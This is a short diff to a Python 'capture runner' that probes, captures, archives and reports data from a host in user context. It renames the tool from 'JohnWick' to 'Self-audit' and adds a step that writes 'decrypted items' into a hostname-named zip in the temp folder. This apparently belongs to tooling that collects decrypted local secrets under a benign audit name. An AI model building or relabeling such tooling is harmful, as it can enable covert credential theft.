@@ -1,4 +1,4 @@
-"""JohnWick capture runner - cross-platform, user-context, no elevation.
+"""Self-audit capture runner - cross-platform, user-context, no elevation.
 
 Pipeline: probe -> capture -> archive -> report. Each stage is isolated so one
 failure degrades the result instead of killing the run.
@@ -48,6 +48,7 @@ def run(dry_run: bool, keep_archive: str | None = None) -> int:
                 caps.append(report_caps_error(label, e))
 
         system = sysinfo.gather()
+        report.write_items(stage, caps)   # decrypted items must land in the archive
         text = report.render_report(caps, system, rows)
         arch, size, nfiles = report.build_archive(
             stage, os.path.join(tempfile.gettempdir(), f"jwg-{system['hostname']}.zip"), caps)
